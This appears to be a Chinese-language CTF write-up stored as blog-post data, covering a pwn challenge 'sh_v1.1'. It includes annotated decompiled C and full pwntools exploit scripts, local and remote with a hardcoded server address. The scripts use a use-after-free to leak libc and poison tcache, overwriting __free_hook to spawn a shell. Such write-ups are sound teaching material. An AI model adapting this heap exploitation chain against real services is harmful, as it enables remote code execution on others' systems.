sl('touch '+str(filename))\n  sl(str(filedata))\n\ndef gedit(filename,filedata):\n  ru('>>>>')\n  sl('gedit '+str(filename))\n  sl(str(filedata))\n\ndef rm(filename):\n  ru('>>>>')\n  sl('rm '+str(filename))\n\ndef ln(src,dest):\n  ru('>>>>')\n  sl('ln '+str(src)+' '+str(dest))\n\n\n# fill in tcache\n# file0 --> file6\nfor i in range(7):\n  touch('file'+str(i),'aaaaaaaa')\n\n# use to leak libc\n# file7 == file8\ntouch('file7','bbbbbbbb')\nln('file7','file8')\ntouch('file9','cccccccc') # escape for being combined into top chunk\n# use to leak heap\n# file1 == file10\nln('file1','file10')\n\n# fill in tcache\nfor i in range(7):\n  rm('file'+str(i))\n\n# leak libc\nrm('file7')\n# debug()\ncat('file8')\nlibc_addr=uu64(ru('\\n')[:-1])\nmalloc_hook=libc_addr-96-0x10\nlibcbase=malloc_hook-libc.sym['__malloc_hook']\nfree_hook=libcbase+libc.sym['__free_hook']\nsys_addr=libcbase+libc.sym['system']\n\n# leak heap addr\ncat('file10')\nheapbase=uu64(ru('\\n')[:-1])-0x2a0\n\n# overwrite free hook\npayload=p64(free_hook)\npayload=payload.ljust(0x20,b'\\x00')\n  \ngedit('file10',payload)\n\n# get tcache\nfor i in range(6):\n  touch('file'+str(11+i),'aaaaaaaa')\n\nleak('sys_addr',hex(sys_addr))\nleak('malloc_hook',hex(malloc_hook))\nleak('free_hook',hex(free_hook))\nleak('libcbase',hex(libcbase))\nleak('heapbase',hex(heapbase))\n# debug()\n\n# get free_hook\npayload=p64(sys_addr)\ntouch('file17',payload)\n\ntouch('file18','/bin/sh\\x00')\n# debug()\nrm('file18')\n\nitr()\n\n```\n\n远程exp:\n\n```py\nfrom pwn import*\nfrom LibcSearcher import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='sh_v1.1'\nelf=ELF('./'+filename)\n# libc=ELF('./libc-2.31.so')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('121.40.89.206',34883)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \ndef ls():\n  ru('>>>>')\n  sl('ls')\n  return ru('\\n')\n\ndef cat(filename):\n  ru('>>>>')\n  sl('cat '+str(filename))\n\ndef touch(filename,filedata):\n  ru('>>>>')\n  sl('touch '+str(filename))\n  sl(str(filedata))\n\ndef gedit(filename,filedata):\n  ru('>>>>')\n  sl('gedit '+str(filename))\n  sl(str(filedata))\n\ndef rm(filename):\n  ru('>>>>')\n  sl('rm '+str(filename))\n\ndef ln(src,dest):\n  ru('>>>>')\n  sl('ln '+str(src)+' '+str(dest))\n\n\n# fill in tcache\n# file0 --> file6\nfor i in range(7):\n  touch('file'+str(i),'aaaaaaaa')\n\n# use to leak libc\n# file7 == file8\ntouch('file7','bbbbbbbb')\nln('file7','file8')\ntouch('file9','cccccccc') # escape for being combined into top chunk\n# use to leak heap\n# file1 == file10\nln('file1','file10')\n\n# fill in tcache\nfor i in range(7):\n  rm('file'+str(i))\n\n# leak libc\nrm('file7')\n# debug()\ncat('file8')\nlibc_addr=uu64(ru('\\n')[:-1])\nmalloc_hook=libc_addr-96-0x10\n\n# leak heap addr\ncat('file10')\nheapbase=uu64(ru('\\n')[:-1])-0x2a0\n\n\nlibc=LibcSearcher('__malloc_hook',malloc_hook)\nlibcbase=malloc_hook-libc.dump('__malloc_hook')\nfree_hook=libcbase+libc.dump('__free_hook')\nsys_addr=libcbase+libc.dump('system')\n\nleak('sys_addr',hex(sys_addr))\nleak('malloc_hook',hex(malloc_hook))\nleak('free_hook',hex(free_hook))\nleak('libcbase',hex(libcbase))\nleak('heapbase',hex(heapbase))\n\n# overwrite free_hook\npayload=p64(free_hook)\npayload=payload.ljust(0x20,b'\\x00')\n  \ngedit('file10',payload)\n\n# get tcache\nfor i in range(6):\n  touch('file'+str(11+i),'aaaaaaaa')\n\n# debug()\n\n# get free_hook\npayload=p64(sys_addr)\ntouch('file17',payload)\n\n# get shell\ntouch('file18',b'/bin/sh\\x00')\nrm('file18')\n\nitr()\n\n```\n\n","slug":"pwnhub_sh_v1.1","published":1,"updated":"2023-03-13T06:22:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czage005b5oudgbgihn2r","content":"<p>感觉是一个有问题的shell，应该是UAF。</p>\n<span id=\"more\"></span>\n\n<p>64位保护全开，写的是一个shell。</p>\n<p>输入以空格<code>&#39; &#39;</code>分割三个参数，存储在bss段中处理。</p>\n<p>代码有很多干扰</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> k; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> ii; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> jj; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> kk; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> m; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> n; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> mm; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !parameter1[<span class=\"number\">0</span>] )                         <span class=\"comment\">// 如果参数1为空则进入</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;command is NULL!!!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;ls&quot;</span>) )              <span class=\"comment\">// 如果参数1是ls</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">79</span>; ++i )                 <span class=\"comment\">// 输入一个列表</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * i) == <span class=\"number\">1LL</span> )       <span class=\"comment\">// *(base+6*i)==1则输出</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s &quot;</span>, &amp;file_flag + <span class=\"number\">48</span> * i + <span class=\"number\">8</span>); <span class=\"comment\">// 输入base+48*i+8指向的内容</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">putchar</span>(<span class=\"string\">&#x27;\\n&#x27;</span>);                              <span class=\"comment\">// 输出&#x27;\\n&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;cat&quot;</span>) )             <span class=\"comment\">// cat指令</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( parameter2[<span class=\"number\">0</span>] )                        <span class=\"comment\">// 如果第二个参数有内容</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">79</span>; ++j )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * j + <span class=\"number\">8</span>) )<span class=\"comment\">// base+48*j+8处的内容与参数2相同</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * j) == <span class=\"number\">1LL</span> )   <span class=\"comment\">// base+6*j指向内容为1，否则说明no file</span></span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            <span class=\"built_in\">puts</span>(file_data[<span class=\"number\">6</span> * j]);             <span class=\"comment\">// 输出base2+6*i处的qword</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">LABEL_223:</span><br><span class=\"line\">          <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;NO FILE&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_223;</span><br><span class=\"line\">    &#125;                                           <span class=\"comment\">// no file</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">  &#125;                                             <span class=\"comment\">// filename is null</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;touch&quot;</span>) )           <span class=\"comment\">// touch指令</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( parameter2[<span class=\"number\">0</span>] )                        <span class=\"comment\">// 第二个参数有值</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( k = <span class=\"number\">0</span>; k &lt;= <span class=\"number\">79</span>; ++k )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*(&amp;file_flag + <span class=\"number\">6</span> * k) )           <span class=\"comment\">// 如果原本为空</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          *(&amp;file_flag + <span class=\"number\">6</span> * k) = <span class=\"number\">1LL</span>;          <span class=\"comment\">// 使*(base+6*k)=1,表示有文件</span></span><br><span class=\"line\">          file_data[<span class=\"number\">6</span> * k] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x208</span>uLL);</span><br><span class=\"line\">          read_buf(file_data[<span class=\"number\">6</span> * k], <span class=\"number\">0x208</span>uLL); <span class=\"comment\">// 读入文件内容</span></span><br><span class=\"line\">          <span class=\"built_in\">strcpy</span>(&amp;file_flag + <span class=\"number\">48</span> * k + <span class=\"number\">8</span>, parameter2);<span class=\"comment\">// 将参数2的内容(file name)复制到file_flag+48*k+8</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">LABEL_807:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Maximum number of files. Please delete the file.&quot;</span>);<span class=\"comment\">// 文件最多80个</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">LABEL_711:</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;file_name is NULL&quot;</span>);                  <span class=\"comment\">// 第二个参数是filename</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;cp&quot;</span>) )              <span class=\"comment\">// 复制</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] || !parameter3[<span class=\"number\">0</span>] )     <span class=\"comment\">// filename为空</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">8</span>) &amp;&amp; file_flag == <span class=\"number\">1LL</span> )<span class=\"comment\">// 第1个file存在且filename与参数2相同</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( m = <span class=\"number\">0</span>; m &lt;= <span class=\"number\">79</span>; ++m )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter3, &amp;file_flag + <span class=\"number\">48</span> * m + <span class=\"number\">8</span>) )<span class=\"comment\">// 存在一个filename与参数3相同</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">strncpy</span>(file_data[<span class=\"number\">6</span> * m], file_data[<span class=\"number\">0</span>], <span class=\"number\">0x208</span>uLL);<span class=\"comment\">// 复制文件内容，第1个到第m个</span></span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( n = <span class=\"number\">0</span>; ; ++n )                      <span class=\"comment\">//没有同名的file,检查有没有空余位置,有则复制到新文件</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( n &gt; <span class=\"number\">79</span> )                           <span class=\"comment\">// 文件太多</span></span><br><span class=\"line\">          <span class=\"keyword\">goto</span> LABEL_807;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !*(&amp;file_flag + <span class=\"number\">6</span> * n) )</span><br><span class=\"line\">          <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      *(&amp;file_flag + <span class=\"number\">6</span> * n) = <span class=\"number\">1LL</span>;              <span class=\"comment\">// 写入标志位</span></span><br><span class=\"line\">      file_data[<span class=\"number\">6</span> * n] = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x208</span>uLL);\t\t<span class=\"comment\">// 分配data的空间</span></span><br><span class=\"line\">      <span class=\"built_in\">strcpy</span>(&amp;file_flag + <span class=\"number\">48</span> * n + <span class=\"number\">8</span>, parameter3); <span class=\"comment\">// 复制第三个参数到filename</span></span><br><span class=\"line\">      <span class=\"built_in\">strncpy</span>(file_data[<span class=\"number\">6</span> * n], file_data[<span class=\"number\">0</span>], <span class=\"number\">0x208</span>uLL); <span class=\"comment\">// 复制data</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_840; \t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;gedit&quot;</span>) )\t\t\t<span class=\"comment\">// gedit指令</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] )\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( ii = <span class=\"number\">0</span>; ; ++ii )\t\t\t\t\t\t</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ii &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * ii + <span class=\"number\">8</span>) ) <span class=\"comment\">// 比较参数二和文件名</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * ii) == <span class=\"number\">1LL</span> )\t\t\t\t<span class=\"comment\">// 文件已经存在</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      read_buf(file_data[<span class=\"number\">6</span> * ii], <span class=\"number\">0x200</span>uLL);\t\t\t<span class=\"comment\">// 写入0x200byte的data</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;rm&quot;</span>) )\t\t\t\t<span class=\"comment\">// 删除</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] )\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( jj = <span class=\"number\">0</span>; ; ++jj )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( jj &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * jj + <span class=\"number\">8</span>) ) <span class=\"comment\">// 比较参数二和文件名</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * jj) == <span class=\"number\">1LL</span> ) <span class=\"comment\">// 文件已经存在</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(file_data[<span class=\"number\">6</span> * jj]); \t\t\t<span class=\"comment\">// free并赋0</span></span><br><span class=\"line\">      file_data[<span class=\"number\">6</span> * jj] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">      *(&amp;file_flag + <span class=\"number\">6</span> * jj) = <span class=\"number\">0LL</span>;\t\t<span class=\"comment\">// 清空标志位</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;\t\t\t\t\t  <span class=\"comment\">// 文件名没管，不知道有无影响</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(parameter1, <span class=\"string\">&quot;ln&quot;</span>) )\t\t\t\t\t\t\t<span class=\"comment\">// ln指令</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !parameter2[<span class=\"number\">0</span>] )\t\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !parameter3[<span class=\"number\">0</span>] )\t\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件名为null</span></span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_711;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( kk = <span class=\"number\">0</span>; ; ++kk )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( kk &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_840;\t\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(parameter2, &amp;file_flag + <span class=\"number\">48</span> * kk + <span class=\"number\">8</span>) )\t<span class=\"comment\">// 找参数二对应的文件名</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;file_flag + <span class=\"number\">6</span> * kk) != <span class=\"number\">1LL</span> )\t\t\t\t<span class=\"comment\">// 标志位为0</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_840:</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;file:%s is not exist;&quot;</span>, parameter2);\t<span class=\"comment\">// 文件不存在</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( mm = <span class=\"number\">0</span>; ; ++mm )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( mm &gt; <span class=\"number\">79</span> )</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> LABEL_807;\t\t\t\t\t\t\t\t<span class=\"comment\">// 文件太多了</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;file_flag + <span class=\"number\">6</span> * mm) )\t\t\t\t\t<span class=\"comment\">// 找到一个空位</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(&amp;file_flag + <span class=\"number\">48</span> * mm + <span class=\"number\">8</span>, parameter3);\t\t<span class=\"comment\">// 复制第三个参数到file name</span></span><br><span class=\"line\">  *(&amp;file_flag + <span class=\"number\">6</span> * mm) = <span class=\"number\">1LL</span>;\t\t\t\t\t<span class=\"comment\">// 标志位设1</span></span><br><span class=\"line\">  file_data[<span class=\"number\">6</span> * mm] = file_data[<span class=\"number\">6</span> * kk];\t\t<span class=\"comment\">// copy data,从p2到p3</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由上可以大概看出这个shell的功能：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls: 输出所有flag为1的filename</span><br><span class=\"line\">cat p2: 输出p2指定filename的filedata </span><br><span class=\"line\">touch p2: 创建p2指定filename的文件，并输入文件内容(最大0x208byte) </span><br><span class=\"line\">cp p2 p3: 将名为p2的file复制到名为p3的file中，若不存在名为p3的文件则新建，p2必须是第一个文件的文件名 </span><br><span class=\"line\">gedit p2: 修改名为p2的file的内容(最多0x200byte)</span><br><span class=\"line\">rm p2: 删除名为p2的file，对标志位和chunk指针赋0</span><br><span class=\"line\">ln p2 p3: 将名为p2的file的filedata复制到一个新的名为p3的file中 